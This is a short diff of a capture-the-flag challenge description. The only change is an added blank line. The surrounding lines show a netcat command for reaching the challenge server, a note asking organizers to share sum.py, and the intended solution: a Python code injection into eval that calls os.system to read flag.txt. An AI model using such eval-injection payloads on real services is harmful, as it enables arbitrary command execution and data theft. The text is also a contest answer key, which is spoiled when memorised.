@@ -14,6 +14,7 @@ code, but he's not sure the code is flawless.
 to solve this issue. Doing so is against the rules.
 
 `nc <server_ip> <server_port>`
+
 **Obs (to ctf crew):** give the `sum.py` file to contestants as well
 
 **Solution:** inject python code on `eval`: `__import__('os').system('cat flag.txt')`
